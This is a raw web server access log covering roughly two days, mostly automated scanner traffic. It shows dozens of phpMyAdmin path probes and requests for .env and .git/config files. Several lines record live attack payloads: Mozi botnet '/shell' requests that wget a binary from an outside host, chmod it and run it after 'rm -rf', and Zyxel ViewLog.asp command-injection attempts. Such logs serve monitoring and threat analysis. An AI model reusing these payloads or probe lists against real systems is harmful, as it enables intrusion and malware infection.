153.133.5.212 - - [01/Oct/2022:21:11:56 +0300] "GET /admin/sqladmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:57 +0300] "GET /mysql/web/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:57 +0300] "GET /phpMyAdmin-5.1.0/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:57 +0300] "GET /db/phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:58 +0300] "GET /administrator/PMA/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:58 +0300] "GET /phpMyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:58 +0300] "GET /sql/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:59 +0300] "GET /db/phpMyAdmin-5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:59 +0300] "GET /administrator/web/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:11:59 +0300] "GET /phpmyadmin2013/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:00 +0300] "GET /mysql-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:00 +0300] "GET /sql/phpmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:00 +0300] "GET /shopdb/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:01 +0300] "GET /sql/sqladmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:01 +0300] "GET /phpmyadmin2020/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:01 +0300] "GET /phpMyAdmin5.2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:02 +0300] "GET /php-my-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:02 +0300] "GET /db/phpmyadmin4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:02 +0300] "GET /database/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:02 +0300] "GET /db/myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:03 +0300] "GET /sql/myadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:03 +0300] "GET /phpMyAdmin4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:03 +0300] "GET /admin/phpmyadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:04 +0300] "GET /program/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:04 +0300] "GET /admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:04 +0300] "GET /mysql/sqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:05 +0300] "GET /db/phpmyadmin5/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:05 +0300] "GET /administrator/admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:05 +0300] "GET /sql/webadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:06 +0300] "GET /phpMyAdmin-5.1.2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:06 +0300] "GET /phpmyadmin2017/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:06 +0300] "GET /phpMyAdmin3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:07 +0300] "GET /phpMyAdmin-5.1.3/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:07 +0300] "GET /phpMyAdmin2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:07 +0300] "GET /mysql/pma/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:08 +0300] "GET /mysql/pMA/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:08 +0300] "GET /PMA/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:08 +0300] "GET /_phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:09 +0300] "GET /_phpmyadmin_/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:09 +0300] "GET /phpMyAdmin-4.9.7/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:09 +0300] "GET /phpmyadmin2018/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:10 +0300] "GET /db/db-admin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:10 +0300] "GET /db/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:10 +0300] "GET /phpmyadmin2012/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:11 +0300] "GET /phpMyAdmin5.1/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:11 +0300] "GET /mysqladmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:11 +0300] "GET /sql/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:12 +0300] "GET /phpmyadmin1/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:12 +0300] "GET /phpMyAdmin-4/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:12 +0300] "GET /admin/sysadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:13 +0300] "GET /administrator/phpMyAdmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:13 +0300] "GET /phpmyadmin2022/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:13 +0300] "GET /admin/web/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:14 +0300] "GET /db/websql/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:14 +0300] "GET /phpmyadmin2/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:14 +0300] "GET /phpmyadmin2021/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:14 +0300] "GET /mysql/dbadmin/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
153.133.5.212 - - [01/Oct/2022:21:12:15 +0300] "GET /mysqlmanager/index.php?lang=en HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36"
152.89.196.211 - - [01/Oct/2022:21:32:27 +0300] "GET /actuator/gateway/routes HTTP/1.1" 404 188 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
80.94.92.231 - - [01/Oct/2022:21:34:08 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
20.219.137.90 - - [01/Oct/2022:21:40:31 +0300] "GET /.env HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.219.137.90 - - [01/Oct/2022:21:40:32 +0300] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
80.94.92.239 - - [01/Oct/2022:21:51:18 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.46.172.62 - - [01/Oct/2022:21:57:20 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
46.46.172.62 - - [01/Oct/2022:21:57:21 +0300] "GET /HNAP1/ HTTP/1.1" 404 125 "http://82.179.90.12/" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
178.62.106.82 - - [01/Oct/2022:21:59:51 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
74.108.124.79 - - [01/Oct/2022:22:28:23 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
74.108.124.79 - - [01/Oct/2022:22:28:23 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
172.91.47.43 - - [01/Oct/2022:23:09:25 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "r00ts3c-owned-you"
172.91.47.43 - - [01/Oct/2022:23:09:25 +0300] "ep.zyxel80;rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
94.43.10.155 - - [01/Oct/2022:23:26:26 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://94.43.10.155:60517/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 153 "-" "Hello, world"
40.76.16.227 - - [01/Oct/2022:23:30:44 +0300] "GET /.env HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
40.76.16.227 - - [01/Oct/2022:23:30:44 +0300] "POST / HTTP/1.1" 405 157 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
20.58.6.132 - - [01/Oct/2022:23:48:18 +0300] "GET /.env HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.58.6.132 - - [01/Oct/2022:23:48:18 +0300] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
176.58.97.26 - - [02/Oct/2022:00:13:23 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:8.0) Gecko/20100101 Firefox/8.0"
37.140.53.39 - - [02/Oct/2022:00:50:02 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
164.52.24.169 - - [02/Oct/2022:01:08:24 +0300] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\x92<\xC9B7\xCB)\xE1}\x95\xBAzx\x89\xDA\xA9\xA6\xF1\xD5\x01\xA1\x98\x91yu0\x0Bv\xC4\x8Fw` B\x01\xECG" 400 157 "-" "-"
164.52.24.169 - - [02/Oct/2022:01:08:25 +0300] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xC9(\x90\xBA\xDDuf\xDD\x89xN+\x12\x83\x9C\x83\xD5\x8B\xE3\x5C.\x99w>G\xE2.\xF5\xB7\x01\x1A\xCA\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 157 "-" "-"
164.52.24.169 - - [02/Oct/2022:01:08:26 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\xBA!>\xB3)\xF8\xE9\xC61*d\xD1\xCF\x97\x08hK\x02\xDF\xC4M!\xCA\x84\x88\xEA\xC1\xFEE\xC5\x18\xA4\x00\x00\x12\xC0" 400 157 "-" "-"
164.52.24.169 - - [02/Oct/2022:01:08:26 +0300] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\xB6\xC3sA\xD4\x05\xE2A\x89\xDA\xA4\xD5s\xF7\x8A9\x9A\x90\xDB\xA0\x87\x1D\x5C\x8D#f\xD2Bz\xA1\x96\x8A\x00\x00\x12\xC0" 400 157 "-" "-"
164.52.24.169 - - [02/Oct/2022:01:08:39 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
164.52.24.169 - - [02/Oct/2022:01:08:45 +0300] "GET /favicon.ico HTTP/1.1" 404 153 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
85.31.46.179 - - [02/Oct/2022:01:15:12 +0300] "POST /boaform/admin/formLogin HTTP/1.1" 404 125 "http://82.179.90.12:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
85.31.46.179 - - [02/Oct/2022:01:15:12 +0300] "" 400 0 "-" "-"
3.239.0.93 - - [02/Oct/2022:01:19:49 +0300] "GET /.git/config HTTP/1.1" 404 125 "-" "python-requests/2.28.1"
128.14.209.162 - - [02/Oct/2022:02:24:00 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
178.62.106.82 - - [02/Oct/2022:02:37:44 +0300] "a\xA8\xCB\xBAT.f\x012d\xB9=r\x87S\xCC" 400 157 "-" "-"
178.62.106.82 - - [02/Oct/2022:02:37:44 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x036\xDD\x12<\x04\x1D\xFCP\xF0\xF9\x09q\xA5%\xC8\x83w\xAC(N\x14-\xF87\x04\xA6-\xA7\x0Cr\xF3[\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [02/Oct/2022:02:37:44 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xEEF\xCB\xC3\xFE\xDA\xAA\x132\x84\xB9\x5C\x0B\xFCv\xE94S\xB5\x09y\xAFlR\x8B=\xD1Bbx\xED]\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [02/Oct/2022:02:37:44 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
94.102.61.10 - - [02/Oct/2022:03:03:43 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
88.98.43.86 - - [02/Oct/2022:03:51:54 +0300] "GET /.env HTTP/1.1" 404 188 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
88.98.43.86 - - [02/Oct/2022:03:51:54 +0300] "POST / HTTP/1.1" 405 559 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.72.76.232 - - [02/Oct/2022:03:58:15 +0300] "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1" 404 153 "-" "Hello, world"
42.192.229.106 - - [02/Oct/2022:04:35:09 +0300] "POST /cgi-bin/ViewLog.asp HTTP/1.1" 404 125 "-" "Hello, world"
42.192.229.106 - - [02/Oct/2022:04:35:09 +0300] "rm+-rf+arm7%3b%23&remoteSubmit=Save" 400 157 "-" "-"
178.62.106.82 - - [02/Oct/2022:04:52:42 +0300] "Z\xA2Z\xBC\x22\x8EPf\x1E\x11\x11kK\xD7D\xB3" 400 157 "-" "-"
178.62.106.82 - - [02/Oct/2022:04:52:42 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03!\x92\x16\xAA\xDB\xA6r\xAB@\xA1\xE6E\xDC;\xCC.\x1E\x1F^\xA3{\x89Ba\xBB$x\x5C\x9E1\x00\xFC\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 157 "-" "-"
178.62.106.82 - - [02/Oct/2022:04:52:42 +0300] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03'\xF7s\xD7\xDFF\xD4\x80_\xC1\xD5\xF63\xFB\xA9z\xAD\xD6\xE7p\xEAiCW\xE6D\x14A\xBA\x8D\xD6" 400 157 "-" "-"
178.62.106.82 - - [02/Oct/2022:04:52:42 +0300] "GET / HTTP/1.1" 200 1286 "-" "Mozilla/5.0 zgrab/0.x"
184.105.139.69 - - [02/Oct/2022:05:02:45 +0300] "GET / HTTP/1.1" 200 3320 "-" "-"
184.105.139.85 - - [02/Oct/2022:05:07:03 +0300] "GET /favicon.ico HTTP/1.1" 404 125 "-" "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0"
117.242.43.193 - - [02/Oct/2022:05:37:42 +0300] "GET / HTTP/1.1" 200 3320 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
